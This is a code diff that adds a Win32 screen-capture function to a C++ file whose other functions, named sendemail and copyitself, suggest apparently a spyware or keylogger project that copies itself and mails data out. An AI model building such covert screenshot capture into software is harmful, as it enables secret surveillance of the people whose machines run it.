@@ -1,6 +1,4 @@
-
 #include "util.h"
-
 void sendemail()
 {
 	bool bError = false;
@@ -113,8 +111,71 @@ void copyitself(const char *s)
 		source.close();
 		dest.close();
 	}
-	
 	//getchar();
 }
 
+int ScreenCapture(const char* fname)
+{
+	int result = 0;
+	HWND hWnd = GetDesktopWindow();
+	HBITMAP hbmScreen = NULL;
+	HDC hdcScreen = GetDC(NULL);
+	HDC hdcWindow = GetDC(hWnd);
+	int w = GetSystemMetrics(SM_CXSCREEN);
+	int h = GetSystemMetrics(SM_CYSCREEN);
 
+	HDC hdcMemDC = CreateCompatibleDC(hdcWindow);
+	if (!hdcMemDC) goto cleanup;
+
+	hbmScreen = CreateCompatibleBitmap(hdcWindow, w, h);
+	if (!hbmScreen) goto cleanup;
+
+	SelectObject(hdcMemDC, hbmScreen);
+	if (!BitBlt(hdcMemDC, 0, 0, w, h, hdcWindow, 0, 0, SRCCOPY)) goto cleanup;
+
+	BITMAPFILEHEADER   bmfHeader;
+	BITMAPINFOHEADER   bi;
+
+	bi.biSize = sizeof(BITMAPINFOHEADER);
+	bi.biWidth = w;
+	bi.biHeight = h;
+	bi.biPlanes = 1;
+	bi.biBitCount = 32;
+	bi.biCompression = BI_RGB;
+	bi.biSizeImage = 0;
+	bi.biXPelsPerMeter = 0;
+	bi.biYPelsPerMeter = 0;
+	bi.biClrUsed = 0;
+	bi.biClrImportant = 0;
+
+	DWORD dwBmpSize = ((w * bi.biBitCount + 31) / 32) * 4 * h;
+
+	HANDLE hDIB = GlobalAlloc(GHND, dwBmpSize);
+	char* lpbitmap = (char*)GlobalLock(hDIB);
+
+	GetDIBits(hdcWindow, hbmScreen, 0, h, lpbitmap, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
+
+	bmfHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER);
+	bmfHeader.bfSize = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+	bmfHeader.bfType = 0x4D42; //'BM' for Bitmaps
+
+	DWORD temp = 0;
+	HANDLE hFile = CreateFileA(fname, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	WriteFile(hFile, (LPSTR)&bmfHeader, sizeof(BITMAPFILEHEADER), &temp, NULL);
+	WriteFile(hFile, (LPSTR)&bi, sizeof(BITMAPINFOHEADER), &temp, NULL);
+	WriteFile(hFile, (LPSTR)lpbitmap, dwBmpSize, &temp, NULL);
+	CloseHandle(hFile);
+
+	GlobalUnlock(hDIB);
+	GlobalFree(hDIB);
+
+	result = 1; //success
+
+cleanup:
+	DeleteObject(hbmScreen);
+	DeleteObject(hdcMemDC);
+	ReleaseDC(NULL, hdcScreen);
+	ReleaseDC(hWnd, hdcWindow);
+
+	return result;
+}
